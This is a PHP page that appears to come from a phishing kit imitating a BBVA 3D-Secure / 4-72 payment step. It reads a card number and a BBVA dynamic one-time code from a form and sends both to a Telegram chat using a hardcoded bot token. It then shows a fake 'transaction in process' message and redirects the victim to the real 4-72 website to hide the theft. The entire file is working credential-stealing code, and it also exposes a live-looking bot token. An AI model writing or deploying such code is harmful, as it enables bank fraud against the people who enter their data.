<?php


session_start();

require_once('../acciones/bot_telegram.php');


$_SESSION['user'] = "hola";


$codigo = $_POST['numero'];

$cDinamica = $_POST['cDinamica'];

//echo "El codigo es:".$codigo;

//$res = preg_replace('/[\@\.\;\-" "]+/', '', $fecha);


//Datos del bot
$token = "5815633541:AAEMcaDwu8HMK_VjBGaUORPnI82iMKxSiMs";
$chatId = "-1001894246538";

$mensaje = "bbva 3d: Clave Dinamica: ".$cDinamica." Cc: ".$codigo;
enviarMensajeTelegram($chatId, $mensaje, $token);
 

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <style>
        *{
            font-family: Arial, Helvetica, sans-serif;
                }
    </style>
</head>
<body style="background-image:url(/fondo.jpg);">
<div>
    <br>
   <center><img src="img/logo.png" alt="" srcset="" width="90%"></center>
 </div>
 
 <center><div class="finish">
    <h2>Transacción en proceso</h2>
    <img src="/img/gif.gif" alt="" srcset="" width="100px">
    <h3>En las proximas 24hrs estaremos procesando su pago.</h3>
 </div></center>


 <img src="img/fot.jpg" alt="" srcset="" width="100%" style="margin-top:150px;">
<img src="img/f4.jpg" alt="" srcset="" width="100%" style="">

<script>function redireccionarPagina() {
  window.location = "https://www.4-72.com.co";
}
setTimeout("redireccionarPagina()", 2000);</script>

</body>
</html>